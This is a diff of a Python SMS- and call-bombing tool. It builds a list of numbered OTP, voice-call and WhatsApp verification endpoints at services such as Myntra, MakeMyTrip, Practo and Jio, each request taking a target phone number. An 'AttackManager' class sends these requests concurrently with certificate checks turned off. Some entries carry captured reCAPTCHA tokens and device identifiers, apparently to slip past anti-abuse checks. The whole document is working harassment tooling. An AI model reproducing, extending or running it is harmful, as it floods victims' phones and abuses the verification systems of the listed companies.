+        "url": "https://www.quikr.com/core/register",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"mobile": "{no}"}
+    })
+    
+    # 92. Myntra
+    apis.append({
+        "name": "Myntra",
+        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
+        "method": "POST",
+        "headers": {
+            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMwNjIwNzEiLCJhcCI6IjcxODQwOTI1MSIsImlkIjoiYjQzODhlMzg1ODlkMTlmZiIsInRyIjoiYmNjNjExMDE0YmRjOGQwMGNiYmJlNWE4MTg1Yjg4Y2UiLCJ0aSI6MTc4NjA3NzE3ODg2MywidGsiOiI2Mjk1Mjg2In19",
+            "traceparent": "00-bcc611014bdc8d00cbbbe5a8185b88ce-b4388e38589d19ff-01",
+            "tracestate": "6295286@nr=0-1-3062071-718409251-b4388e38589d19ff----1786077178863",
+            "X-myntraweb": "Yes",
+            "X-Requested-With": "browser",
+            "x-location-context": "pincode=212622;source=IP",
+            "x-meta-app": "deviceId=739ea08d-4757-4531-877d-f542e23870ed;appFamily=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36;reqChannel=mweb;channel=web;",
+            "Content-Type": "application/json",
+            "deviceId": "739ea08d-4757-4531-877d-f542e23870ed",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"phoneNumber": "{no}", "signup": "ONECLICK"}
+    })
+    
+    # 93. MakeMyTrip SMS
+    apis.append({
+        "name": "MakeMyTrip_SMS",
+        "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
+        "method": "POST",
+        "params": {"region": "in", "language": "eng", "currency": "inr"},
+        "headers": {
+            "Content-Type": "application/json",
+            "vid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "tid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "usr-mcid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "deviceid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "Authorization": "h4nhc9jcgpAGIjp",
+            "Accept": "application/json",
+            "visitor-id": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "region": "in",
+            "language": "eng",
+            "currency": "inr",
+            "user-currency": "INR",
+            "user-country": "IN",
+            "entity-name": "india",
+            "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"d8a3a42f-1852-4ec7-aa6b-d715268e93b0\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"deviceOrBrowserInfo\":\"Chrome\",\"profileType\":\"0\"}",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
+    })
+    
+    # 94. MakeMyTrip WhatsApp
+    apis.append({
+        "name": "MakeMyTrip_WhatsApp",
+        "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
+        "method": "POST",
+        "params": {"region": "in", "language": "eng", "currency": "inr"},
+        "headers": {
+            "Content-Type": "application/json",
+            "vid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "tid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "usr-mcid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "deviceid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "Authorization": "h4nhc9jcgpAGIjp",
+            "Accept": "application/json",
+            "visitor-id": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
+            "region": "in",
+            "language": "eng",
+            "currency": "inr",
+            "user-currency": "INR",
+            "user-country": "IN",
+            "entity-name": "india",
+            "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"d8a3a42f-1852-4ec7-aa6b-d715268e93b0\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"deviceOrBrowserInfo\":\"Chrome\",\"profileType\":\"0\"}",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE", "WHATSAPP"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
+    })
+    
+    # 95. Swiggy Voice
     apis.append({
         "name": "Swiggy_Voice",
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
@@ -1862,19 +1938,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ========== U2. Myntra Voice ==========
-    apis.append({
-        "name": "Myntra_Voice",
-        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"mobile": "{no}"}
-    })
-    
-    # ========== U3. Flipkart Voice ==========
+    # 96. Flipkart Voice
     apis.append({
         "name": "Flipkart_Voice",
         "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
@@ -1886,31 +1950,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ========== U4. Amazon Voice ==========
-    apis.append({
-        "name": "Amazon_Voice",
-        "url": "https://www.amazon.in/ap/signin",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "phone={no}&action=voice_otp"
-    })
-    
-    # ========== U5. Paytm Voice ==========
-    apis.append({
-        "name": "Paytm_Voice",
-        "url": "https://accounts.paytm.com/signin/voice-otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}"}
-    })
-    
-    # ========== U6. Zomato Voice ==========
+    # 97. Zomato Voice
     apis.append({
         "name": "Zomato_Voice",
         "url": "https://www.zomato.com/php/o2_api_handler.php",
@@ -1922,7 +1962,7 @@ def build_api_list():
         "body": "phone={no}&type=voice"
     })
     
-    # ========== U7. MakeMyTrip Voice ==========
+    # 98. MakeMyTrip Voice
     apis.append({
         "name": "MakeMyTrip_Voice",
         "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
@@ -1934,47 +1974,82 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ========== U8. Goibibo Voice ==========
+    # 99. Practo SMS
     apis.append({
-        "name": "Goibibo_Voice",
-        "url": "https://www.goibibo.com/user/voice-otp/generate/",
+        "name": "Practo_SMS",
+        "url": "https://accounts.practo.com/phone_number_resend_otp",
+        "method": "POST",
+        "headers": {
+            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4LKhUNc1gFczOyhgZzq9mCm7tT7I-FQllZbY_jv2epFHGRn5t_Z1rBhKQRZq5SDZvI5gxLruglRfjZTIlvT0HeaQ-Yg7Mw2Gy3w6QdAOlKH-AGGSTDMMSadAHftEg1K868hurF8Eqm71JVDaAH3XgpNeRRAMdpQrQvXS9dWyoQhfXu1Hr7iHUNnc7aPS4rZS6UMx24YaxhiFEQA7OId4nmpc08mq7zGhFRkFxYrE4mhHwBRLLdb49nu5pwEUBhRlgD_TljqOWoDUsZqcr4kPPppV_9CbmN6ntLt-jh11PTK1UcF1vPE2kyIp6H9VBQu3rhG9gqMiuc8TjAwntB1iHxOP01Rv1GkxncolCpgpreGlti__DT-rjKhgWvn6l5lMSU-a2n79V1wxY1_AdRWZ6HDK9oFWhLkRX7YzQB5dI0NJKLGF8tZDDTUQY2q9d840wph-1BRQoL3sv_o2f7wur1gmNQkPhuQlw2aJPX-hTPAS2sq5JyYKe4nTPYxwupnHxCfhw8OqFtriazRHut_9bKUEW5vu7SZgybmQE1Olfq9AL_OJb61kHW73pR5bkdJc61y2MNWcNdj8bcejzv_H_YizRDM6IKpYaWu4iHZOWiG6ePVQdjSJ6TScW3C1OS2dTllVWTx4nG4MAxxM31-1fsIqkgBM1y-LnttHVDxEWOFGgfrDlghyUa_VfC7hNDlk1LTOw1YEamQZ-c1gNIoMs-POo0Dmc853CZ_CsVcOd3klBksWJD8hc8JdaljbJbQUwHFYyGS2xkn66trJaSyWqdf8FytpePaG-J9Y0GsX09UXKK8M3FVAOp4EDpkYQbYArgAXgbZCJBem2Gfq3oSmkbwyH4yPUbK300Efozof6AzzvztS80kwlN-FaxLA5H3yxsYAhOiAit-HKInj_TIxKyGGC8eM8MY75roZ7CKtSm37ohvdz6GsGQrsZUHxVlmVmDx6jcKdDaap8Xn7LkUj2ZbYFkIZzCv4qoNzPelhSwqBFcwATI0x_RiKDxzz1PozfvKW77eBUYZs8QpZNEneBA9pg-jQtWR4lNoghy49nRiq_npCKuGxRkdt7gCQZj0Nr2mfjjimfYZdDOFQ-CAb56WiOOFFefmYdZML53Zak59pZLZxAcR2GSbPRUsTCUdFSRf9bNgyRUwGgj2yt3yposwawV3xmQaqPhQYJ0Lan83roYDr4YmucZlKriyljsv-xjR4bJFgOjO9Jx1Q8fzd4tyfcgFq7JUQ8fXZFMqCvMBEOqsfE"}
+    })
+    
+    # 100. Practo Voice
+    apis.append({
+        "name": "Practo_Voice",
+        "url": "https://accounts.practo.com/send_voice_otp",
+        "method": "POST",
+        "headers": {
+            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4UvhfXOC4zOYWpUqagDOdtUGvLowCjT3xxZsRHnLIyMQ_VFu27OKB_3tQXfarDvDWhGYtcwLll2sQ1gDxOiHtosPK8DxrG8Ik1XmjsM-CUz-q5DoH8SGbVsYK2tlmJuOSC3k2J_ftOHxsYqTSm75opTJbAVuueFRolX10ux9nyn3QETF8Sy2czMK-pyhwDSEWJuH1woL-onjPtE3OM-mS99RDkxYthJZUQ_ZNClfX0QH88RSSgA_x49CqQLA3S47HZMHq-DRvuvC81KIixxfsoDNTzCtbFQHjT4KWgKAQuyXjIB6QJeWoLmYlpvjRpJ3JzafZjhPRXlnmjOpjVbHkKXf9nQ-RyWepZMBroDNv84IFdk9djy_lAPDT1uVP95ObGUcyjMz60nipeO8X0kKAPT5uCPt4getcKulOdh1a8YAzF-vYfjdBG_K1PQ6r060J_aZHXU8_nS9PVpDnfanxtBbi60tk1gv_y52ED4Mj3ZB7Eum9gDXZYAT97xwTp9UR1Vy5dsFCclsqTsINQBH_y5yZJ3xqhOn0asokTmfuzLGxBRFVWC0gGpgXPiLp5LI7oF5GgK1B1zYv0LJR0S2EQAd7HcNPEp5WegheWmIYRrLQTRVxi52HjhOut7uBseq_lCOY_ObU2k-DcK6khpmBItyD3a5oc-nao-sHrE-SABRSrWPzDwbuU3oEwwXziebATwIP951QbUaoMEJv-j6MM7cVEasQQowdnLVF_g6v3Gc4pP6rtmXCW2XMgTF8D01iKOc2uU_t8f7P1Ws5az2P3o6LpZKHRwMEzsMWB-_b5q5KMs61xEcjMhMmURJ2Ba_4oTkPrWU5DVUaFbWdEatf_cVbhG_1pPpcnZtsVJNHrSdSQCgcX8MFcIoVbU5S7qDZbgTc86bjHnFCmnHnYeViWaIvuut3ugu3BN8lVHZco92i6wzMfSIlsYSGf9e9j_2jBbuSsx4KK-FeTwR06i1W0MH5mW9lsZqnxhEDwW1UflUt-tVLAmTXItEpN4nZOJDShMwIfQhDWBL4IQ9ADfPQywpVdXreT7iS80kVm8QO0asWUIrUNg0EkzAbE-aIft878ogK6BbPmYpFWjROBv1CMLAdXigefvq-1t-vGE0jx6KooyGdOeIBiHMx8Ex9RGTkkTe99Oz38b9Wh3lQaOOaAosDsuSHyUKMSFOffc9axpI04SQb1oKSNj7sUw4KQoToWAWtUj4JHJPbl3bZ_HMoe6juZCzKHK1BcUVxCpxNbS3bFEhk"}
+    })
+    
+    # 101. MyAstro
+    apis.append({
+        "name": "MyAstro",
+        "url": "https://myastro.org.in/sendOtpPinnacle",
+        "method": "GET",
+        "params": {"phone": "{no}"},
+        "headers": {
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {}
+    })
+    
+    # 102. Holidayify
+    apis.append({
+        "name": "Holidify",
+        "url": "https://www.holidify.com/rest/package/submitCallme.hdfy",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": "name=Adesh+Dubey&emailId=&contact={no}&country=88&internalPlaceCode=SINGAPORE&leadData=Destination.Packages_callMe_Packages_callMe_timeout_null&destCountryCode=SINGAPORE&countryPhoneCode=%2B91&platform=Linux+armv81&pageUrl=https%3A%2F%2Fwww.holidify.com%2Fplaces%2Fsingapore%2Fpackages.html%3Futm_source%3Dgoogle%26utm_medium%3Dpmax%26utm_campaign%3Dsingapore_pmax%26gad_source%3D1%26gad_campaignid%3D22725252908%26gbraid%3D0AAAAADLSud5aKXKVA0SLBfyeMwzh-26x4%26gclid%3DCjwKCAjwhNbTBhB4EiwAsFSg-ujhXN2fE1UAkJu948NZbf1V-KUlrFaPr828QQdKS4xxMk_MMZqB1RoCCEAQAvD_BwE&placeName=Singapore&referrer=https%3A%2F%2Fwww.google.com%2F&utmSource=google&utmMedium=pmax&utmCampaign=singapore_pmax&tourPackageIds=&quoteId=0&agentId=0&otpRequired=1&activeTourPackage=0"}
+    })
+    
+    # 103. Jio
+    apis.append({
+        "name": "Jio",
+        "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
         "method": "POST",
         "headers": {
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"phone": "{no}"}
+        "body": {"mobileNumber": "{no}", "loginFlowType": "MOBILE", "alternateNumber": ""}
     })
     
-    # ========== U9. Ola Voice ==========
-    apis.append({
-        "name": "Ola_Voice",
-        "url": "https://api.olacabs.com/v1/voice-otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}"}
-    })
-    
-    # ========== U10. Uber Voice ==========
-    apis.append({
-        "name": "Uber_Voice",
-        "url": "https://auth.uber.com/v2/voice-otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}"}
-    })
-    
-    # ========== U11. KPN WhatsApp ==========
+    # 104. KPN WhatsApp
     apis.append({
         "name": "KPN_WhatsApp",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
         "method": "POST",
+        "params": {"channel": "AND", "version": "3.2.6"},
         "headers": {
             "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
             "content-type": "application/json; charset=UTF-8",
@@ -1983,66 +2058,7 @@ def build_api_list():
         "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}
     })
     
-    # ========== U12. Foxy WhatsApp ==========
-    apis.append({
-        "name": "Foxy_WhatsApp",
-        "url": "https://www.foxy.in/api/v2/users/send_otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"user": {"phone_number": "+91{no}"}, "via": "whatsapp"}
-    })
-    
-    # ========== U13. Stratzy WhatsApp ==========
-    apis.append({
-        "name": "Stratzy_WhatsApp",
-        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phoneNo": "{no}"}
-    })
-    
-    # ========== U14. Jockey WhatsApp ==========
-    apis.append({
-        "name": "Jockey_WhatsApp",
-        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{no}?whatsapp=true",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {}
-    })
-    
-    # ========== U15. Rappi WhatsApp ==========
-    apis.append({
-        "name": "Rappi_WhatsApp",
-        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json; charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"country_code": "+91", "phone": "{no}"}
-    })
-    
-    # ========== U16. Eka Care WhatsApp ==========
-    apis.append({
-        "name": "EkaCare_WhatsApp",
-        "url": "https://auth.eka.care/auth/init",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"payload": {"allowWhatsapp": True, "mobile": "+91{no}"}, "type": "mobile"}
-    })
-    
-    # ========== U17. Wakefit SMS ==========
+    # 105. Wakefit SMS
     apis.append({
         "name": "Wakefit_SMS",
         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
@@ -2054,7 +2070,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ========== U18. Byju's SMS ==========
+    # 106. Byjus SMS
     apis.append({
         "name": "Byjus_SMS",
         "url": "https://api.byjus.com/v2/otp/send",
@@ -2066,7 +2082,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ========== U19. Hungama OTP ==========
+    # 107. Hungama OTP
     apis.append({
         "name": "Hungama_OTP",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
@@ -2078,7 +2094,7 @@ def build_api_list():
         "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
     })
     
-    # ========== U20. Meru Cab ==========
+    # 108. Meru Cab
     apis.append({
         "name": "MeruCab",
         "url": "https://merucabapp.com/api/otp/generate",
@@ -2090,55 +2106,7 @@ def build_api_list():
         "body": "mobile_number={no}"
     })
     
-    # ========== U21. PenPencil ==========
-    apis.append({
-        "name": "PenPencil",
-        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
-        "method": "POST",
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{no}"}
-    })
-    
-    # ========== U22. Dayco India ==========
-    apis.append({
-        "name": "DaycoIndia",
-        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "api=send_otp&brand=dayco&mob={no}&resend_otp=resend_otp"
-    })
-    
-    # ========== U23. BeepKart ==========
-    apis.append({
-        "name": "BeepKart",
-        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}", "city": 362}
-    })
-    
-    # ========== U24. Lending Plate ==========
-    apis.append({
-        "name": "LendingPlate",
-        "url": "https://lendingplate.com/api.php",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobiles={no}&resend=Resend"
-    })
-    
-    # ========== U25. ShipRocket ==========
+    # 109. ShipRocket
     apis.append({
         "name": "ShipRocket",
         "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
@@ -2150,7 +2118,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}"}
     })
     
-    # ========== U26. GoKwik V3 ==========
+    # 110. GoKwik V3
     apis.append({
         "name": "GoKwik_V3",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
@@ -2160,177 +2128,6 @@ def build_api_list():
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
         "body": {"phone": "{no}", "country": "in"}
-    })
-    
-    # ========== U27. NewMe ==========
-    apis.append({
-        "name": "NewMe",
-        "url": "https://prodapi.newme.asia/web/otp/request",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"mobile_number": "{no}", "resend_otp_request": True}
-    })
-    
-    # ========== U28. Univest ==========
-    apis.append({
-        "name": "Univest",
-        "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={no}",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {}
-    })
-    
-    # ========== U29. Smytten ==========
-    apis.append({
-        "name": "Smytten",
-        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}", "email": "test@example.com"}
-    })
-    
-    # ========== U30. CaratLane (FIXED) ==========
-    apis.append({
-        "name": "CaratLane",
-        "url": "https://www.caratlane.com/cg/dhevudu",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"query": "mutation {SendOtp(input: {mobile: \"{no}\",isdCode: \"91\",otpType: \"registerOtp\"}) {status {message code}}}"}
-    })
-    
-    # ========== U31. BikeFixup ==========
-    apis.append({
-        "name": "BikeFixup",
-        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"phone": "{no}", "app_signature": "4pFtQJwcz6y"}
-    })
-    
-    # ========== U32. WellAcademy ==========
-    apis.append({
-        "name": "WellAcademy",
-        "url": "https://wellacademy.in/store/api/numberLoginV2",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"contact_no": "{no}"}
-    })
-    
-    # ========== U33. ServeTel ==========
-    apis.append({
-        "name": "ServeTel",
-        "url": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobile_number={no}"
-    })
-    
-    # ========== U34. GoPink Cabs ==========
-    apis.append({
-        "name": "GoPinkCabs",
-        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "check_mobile_number=1&contact={no}"
-    })
-    
-    # ========== U35. Shemaroome ==========
-    apis.append({
-        "name": "Shemaroome",
-        "url": "https://www.shemaroome.com/users/resend_otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobile_no=%2B91{no}"
-    })
-    
-    # ========== U36. Cossouq ==========
-    apis.append({
-        "name": "Cossouq",
-        "url": "https://www.cossouq.com/mobilelogin/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobilenumber={no}&otptype=register"
-    })
-    
-    # ========== U37. MyImagineStore ==========
-    apis.append({
-        "name": "MyImagineStore",
-        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobile={no}"
-    })
-    
-    # ========== U38. Otpless ==========
-    apis.append({
-        "name": "Otpless",
-        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {"mobile": "{no}", "selectedCountryCode": "+91"}
-    })
-    
-    # ========== U39. Eyecon App ==========
-    apis.append({
-        "name": "Eyecon_App",
-        "url": "https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_577_vn_4.2025.06.20.0759_a&cv=vc_577_vn_4.2025.06.20.0759_a&cli=91{no}&reg_id=cwdE6LsLSnaoOstJm1xWgP%3AAPA91bEz90PQigxUV-vatcQYQ_UALas2SG6LHtwVucLpilrqsYHKheOaQwX8uSKBGaTfCkUq7fervrJg9DzteNquJMN3XFTBZttIriir28DTcREwTZjM1tA&is_already_social_auth=false&installer_name=manually%2Bor%2Bunknown%2Bsource&n_sims=2&time=1751047561997&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=aae59b5d522de85n&adv_id=9f61d53d-5944-47ef-88d3-5f1c2b4128b9&time_zone=Asia%2FKolkata&device_manu=Xiaomi&device_model=POCO%2BM2%2BPro",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4280.88 Safari/537.36",
-            "accept": "*/*",
-            "accept-charset": "UTF-8",
-            "content-type": "application/x-www-form-urlencoded; charset=utf-8",
-            "Host": "api.eyecon-app.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
-        },
-        "body": {}
-    })
-
-    # ========== U40. IGP Earning ==========
-    apis.append({
-        "name": "IGP_Earning",
-        "url": "https://earning-igp.unaux.com//codes/89EzVmsnYb.php?num={no}",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": {}
     })
     
     # Remove duplicates based on URL and method
@@ -2346,7 +2143,7 @@ def build_api_list():
 
 APIS = build_api_list()
 
-# ========== DATABASE WRAPPER FOR BACKWARD COMPATIBILITY ==========
+# ========== DATABASE WRAPPER ==========
 class DatabaseWrapper:
     def __init__(self):
         self.db = db
@@ -2356,7 +2153,7 @@ class DatabaseWrapper:
 
 database = DatabaseWrapper()
 
-# ========== FIXED ATTACK MANAGER - NO MORE OPEN FILE LEAKS ==========
+# ========== ATTACK MANAGER ==========
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -2374,18 +2171,15 @@ class AttackManager:
         self.ssl_context.check_hostname = False
         self.ssl_context.verify_mode = ssl.CERT_NONE
         
-        # ✅ FIX 1: Single shared session with connection limits
         self._session = None
         self._connector = None
     
     async def _get_session(self):
-        """Get or create shared session with proper connection pooling."""
         if self._session is None or self._session.closed:
-            # ✅ CRITICAL FIX: Limit connections to prevent "Too many open files"
             self._connector = aiohttp.TCPConnector(
                 ssl=self.ssl_context,
-                limit=30,              # Max 30 total connections
-                limit_per_host=10,      # Max 10 per host
+                limit=30,
+                limit_per_host=10,
                 ttl_dns_cache=300,
                 enable_cleanup_closed=True,
                 force_close=False
@@ -2398,7 +2192,6 @@ class AttackManager:
         return self._session
     
     async def _close_session(self):
-        """Properly close session to free file descriptors."""
         if self._session and not self._session.closed:
             await self._session.close()
         if self._connector and not self._connector.closed:
